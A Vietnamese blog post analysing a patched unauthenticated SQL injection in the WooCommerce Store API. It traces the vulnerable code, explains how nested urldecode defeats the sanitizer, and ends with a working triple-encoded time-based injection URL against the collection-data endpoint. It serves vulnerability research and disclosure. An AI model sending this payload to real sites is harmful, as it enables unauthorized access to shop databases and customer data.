![](https://images.viblo.asia/30d046bf-717d-406b-bbae-2ad4ec4bbeb2.png)

# Tóm tắt
Woocommerce là wordpress plugin cho phép xây dựng website bán hàng miễn phí. Hiện tại có hơn 5 triệu website đang sử dụng plugin này.

Lỗi unauthenticated SQLi của Woocommerce xảy ra do sử dụng hàm `wc_sanitize_taxonomy_name` làm sạch dữ liệu trước khi đưa vào truy vấn SQL. Nhưng hàm này lại có thể bypass thông qua triple urlencode.

Còn một lỗi nữa là authenticated SQLi do sử dụng `esc_like` để làm sạch dữ liệu cho câu truy vấn cộng với việc ghép chuỗi nên lỗi SQLi đã xảy ra.

# Tản mạn
*Bạn có thể bỏ qua phần này và vào luôn phần phân tích.*

Hôm qua, ngày 14 tháng 07 năm 2021, mình đi phượt từ quê lên Hà Nội (khoảng 100 cây) toàn thân mệt mỏi rã rời. Lúc đi qua địa phận Hưng Yên, **đoạn từ KM 32 đến KM 17 trên QL5 (AH14)**, mình gặp 3 chốt giao thông và được mời vào làm việc cả 3. Các chú thấy mình không có gương xe liền mời vào làm việc theo đúng quy trình. Sau khi làm việc xong các chú mới biết:

> Xe không gương không phải là xe không có gương
> 
> Gương rơi, gương rụng, gương gãy mất rồi

Và mình cũng trình bày, do còn là sinh viên nghèo nên các chú đã thương xót và bảo:

> Về lắp gương vào nhé

Xong việc, mình cảm ơn các và lên xe rời đi. Tất cả chỉ mất 1 phút 30 giây.

Lên đến nơi, vào khoảng 23:10 anh team lead (@vigov5) có bảo bọn mình rằng **Thằng Woocommerce dính Unauthen SQL injection**. Nhưng lúc đó muộn và cũng mệt nên mình không nghiên cứu ngay mà để đến sáng rồi tính tiếp.

Tin này có được là do ông **[dawgyg](https://twitter.com/thedawgyg)** này share trên twitter.

![](https://images.viblo.asia/41bfde50-57ba-4161-a739-bf8580697ad3.png)

# Phân tích
Sáng thức dậy, sau khi họp team xong mình liền tiến hành việc phân tích lỗi. Mình nghĩ rằng lỗi này mới như vậy chắc chưa có bản vá nhưng không khi vào xem thì thấy đã có bản vá cách 5 tiếng trước rồi.

Vậy thì công việc giờ đơn giản hơn nhiều, chỉ việc xem diff và phân tích tích không cần phải tìm hiểu lỗi nằm ở đoạn nào nữa.

![](https://images.viblo.asia/424cfc59-7fe0-4ee5-8241-d377ae58f43c.png)

Như ta thấy thì có 2 chỗ code được thay đổi:
1. Dòng 280 `includes/data-stores/class-wc-webhook-data-store.php`
2. Dòng 86 `packages/woocommerce-blocks/src/StoreApi/Utilities/ProductQueryFilters.php`

Sau khi phân tích thì mình biết được lỗi unauthen SQL injection là ở đoạn code thứ 2.

> Đoạn code 1 cũng có lỗi SQL injection. Cái này bạn đọc tự nghiên cứu nhé vì nó dễ hơn.

## Tìm endpoint
Điều đầu tiên là cần tìm endpoint để có thể thực thi được hàm gây ra lỗi.

Đầu tiên mình flow ngược lên xem hàm gây ra lỗi được gọi từ đâu, từ đó có thể tìm được endpoint để gọi tới hàm này. Dưới là các bước gọi hàm:

1. `/packages/woocommerce-blocks/src/StoreApi/Utilities/ProductQueryFilters.php:86` hàm `get_attribute_counts`
2. `/packages/woocommerce-blocks/src/StoreApi/Routes/ProductCollectionData.php:110` hàm `get_route_response`
3. `/packages/woocommerce-blocks/src/StoreApi/RoutesController.php:96` hàm `initialize`
4. `/packages/woocommerce-blocks/src/RestApi.php:28` hàm `__construct`

Mục tiêu bây giờ là nhảy được vào hàm `get_attribute_counts` tương ứng với bước số 1.

**Giờ phải đi từ dưới đi lên.**

Theo flow này, mình tìm được đoạn code đăng ký REST API `/packages/woocommerce-blocks/src/StoreApi/RoutesController.php:57`

```php
	/**
	 * Register defined list of routes with WordPress.
	 */
	public function register_routes() {
		foreach ( $this->routes as $route ) {
			register_rest_route(
				$route->get_namespace(),
				$route->get_path(),
				$route->get_args()
			);
		}
	}
```

Đoạn code trên kết hợp với đoạn code định nghĩa danh sách các API ở dưới (`RoutesController.php:70`)

```php
	protected function initialize() {
		global $wp_version;

		$cart_controller  = new CartController();
		$order_controller = new OrderController();

		$this->routes = [
            ...
			'product-collection-data'   => new Routes\ProductCollectionData( $this->schemas->get( 'product-collection-data' ) ),
            ...
		];

		// Batching requires WP 5.6.
		if ( version_compare( $wp_version, '5.6', '>=' ) ) {
			$this->routes['batch'] = new Routes\Batch();
		}
	}
```

Thì mình đã có được enpoint để nhả tới bước 2.

```
/wp-json/wc/store/products/collection-data
```

Cuối cùng, endpoint để có thể nhảy tới `/packages/woocommerce-blocks/src/StoreApi/Utilities/ProductQueryFilters.php:86` trong bước 1 là:

```
/wp-json/wc/store/products/collection-data?calculate_attribute_counts[0][query_type]=and&calculate_attribute_counts[0][taxonomy]=xxx
````

## Phân tích lỗi
Đoạn code có lỗi:

```php
	public function get_attribute_counts( $request, $attributes = [] ) {
		global $wpdb;

        ...

		$attributes_to_count     = array_map( 'wc_sanitize_taxonomy_name', $attributes );
		$attributes_to_count_sql = 'AND term_taxonomy.taxonomy IN ("' . implode( '","', $attributes_to_count ) . '")';
		$attribute_count_sql     = "
			SELECT COUNT( DISTINCT posts.ID ) as term_count, terms.term_id as term_count_id
			FROM {$wpdb->posts} AS posts
			INNER JOIN {$wpdb->term_relationships} AS term_relationships ON posts.ID = term_relationships.object_id
			INNER JOIN {$wpdb->term_taxonomy} AS term_taxonomy USING( term_taxonomy_id )
			INNER JOIN {$wpdb->terms} AS terms USING( term_id )
			WHERE posts.ID IN ( {$product_query_sql} )
			{$attributes_to_count_sql}
			GROUP BY terms.term_id
		";

		$results = $wpdb->get_results( $attribute_count_sql ); // phpcs:ignore

		return array_map( 'absint', wp_list_pluck( $results, 'term_count', 'term_count_id' ) );
	}
```

Mình đã biết từ trước là có lỗi SQL injection nên mình tìm hàm thực thi câu truy vấn SQL
```php
$results = $wpdb->get_results( $attribute_count_sql );
```

Câu lệnh trên nhận vào tham số là `$attribute_count_sql`, biến này lại ghép từ biến `$attributes_to_count_sql`.

Biến `$attributes_to_count_sql` là kết quả đầu ra của hàm `array_map`

```php
$attributes_to_count     = array_map( 'wc_sanitize_taxonomy_name', $attributes );
```

Tham số `$attributes` của hàm `array_map` chính là `calculate_attribute_counts[0][taxonomy]=xxx` ở biến `$_GET`.

Tham số đầu tiên là `wc_sanitize_taxonomy_name` (đây là callback của hàm array_map). Do vậy, mình đi đọc xem hàm này nó làm gì.

```php
function wc_sanitize_taxonomy_name( $taxonomy ) {
	return apply_filters( 'sanitize_taxonomy_name', urldecode( sanitize_title( urldecode( $taxonomy ) ) ), $taxonomy );
}
```

Hàm `wc_sanitize_taxonomy_name` thực hiện làm sạch dữ liệu bằng cách gọi hàm `sanitize_title` (hàm của worpdress).

```
By default, converts accent characters to ASCII characters and further limits the output to alphanumeric characters, underscore (_) and dash (-) through the ‘sanitize_title’ filter.
```

Đào sâu hơn nữa thì hàm `sanitize_title`  làm sạch dữ liệu theo dạng URL. tức là đầu ra sẽ là các ký tự: **a-zA-z0-9, -, _, %**.

**Điểm đáng chú ý ở đoạn code này là sử dụng hàm `urldecode` lồng nhau. Đây là mấu chốt để ta có thể bypass hàm làm sạch dữ liệu**

```php
 urldecode( sanitize_title( urldecode( $taxonomy ) ) )
 ```
 
 ## Khai thác
 Phân tích lỗi xong xuôi, nghe thì ngon lành rồi. Bây giờ là lúc POC lại xem có thật là lỗi hay không!
 
 Mã khai thác
 ```
 /wordpress/wp-json/wc/store/products/collection-data?calculate_attribute_counts[0][query_type]=and&calculate_attribute_counts[1][taxonomy]=xxx%252522%252529%252520or%252520sleep%2525280%25252e1%252529%252523
 ```
 
 Kết quả POC delay 2,759s
 
 ![](https://images.viblo.asia/431bc3dd-49fe-4ec8-9ce2-b8c14ec88f88.png)

Bài phân tích xin kết thúc ở đây!